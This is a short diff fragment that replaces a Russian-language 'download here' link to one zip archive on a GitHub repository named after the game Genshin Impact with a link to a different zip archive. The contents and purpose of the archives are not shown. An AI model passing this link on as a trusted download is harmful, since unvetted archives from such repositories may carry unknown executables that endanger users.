@@ -8,4 +8,4 @@
 
 
 
-Скачать можно здесь - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/defaul1.zip
+Скачать можно здесь - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/123.zip
